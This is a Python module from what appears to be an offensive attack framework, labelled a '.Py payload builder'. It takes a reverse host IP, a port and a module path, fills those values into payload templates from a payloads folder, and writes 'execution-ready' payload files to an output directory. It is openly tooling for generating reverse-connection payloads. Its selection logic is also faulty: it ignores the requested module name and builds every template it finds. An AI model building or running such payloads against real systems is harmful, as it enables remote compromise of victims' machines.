
#basic module description
def description():
    return ".Py payload builder"

#basic module rank
def rank():
    return "Good"

#basic module date
def date():
    return "30.04.2026"

#set arguments
def depargs():
    return {
        "host": "Reverse IPv4",
        "port": "Reverse port",
        "module": "Path to the required post module"
    }

#imports
from StrFuncs import err, evnt, timenow
import ast, os, sys, time

#main function
def main(path):
    try:
        with open(path, "r", encoding="utf-8") as file:
            tree = ast.parse(file.read())
        for node in ast.walk(tree):
            if isinstance(node, ast.FunctionDef) and node.name == "code":
                for item in node.body:
                    if isinstance(item, ast.Return):
                        if hasattr(item.value, "value"):
                            return item.value.value
        return None
    except Exception as er:
        return er

    
#launch func
def launch(args):
    ip = args.get("host")
    port = args.get("port")
    module = args.get("module")
    if module.startswith("payloads"):
        currdir = os.path.dirname(os.path.abspath(__file__))
        payloadspath = os.path.join(currdir, '..', 'payloads')
        trash, name = module.split("/")
        for i in os.listdir(payloadspath):
            if i.endswith(".py") and i != "__init__.py":
                fullpath = os.path.join(payloadspath, i)
                rawcontent = main(fullpath)
                if rawcontent != None:
                    print(f"{evnt()} {timenow()} Module {name} was successfully initialized! ")
                    readycode = rawcontent.format(rhost=ip, rport=port)
                    print(f"{evnt()} {timenow()} Code ready to build")
                    count = 1
                    root = os.path.join(currdir, "..", "..", "output") 
                    os.makedirs(root, exist_ok=True)
                    while True:
                        outpath = os.path.join(root, f"payload{count}.py")
                        if not os.path.exists(outpath):
                            break
                        count += 1
                    with open(outpath, "w", encoding="utf-8") as payload:
                        payload.write(readycode)
                        print(f"{evnt()} {timenow()} Execution-ready payload has been initialized")

    else:
        print(f"{err()} Module {module} not found!")

            

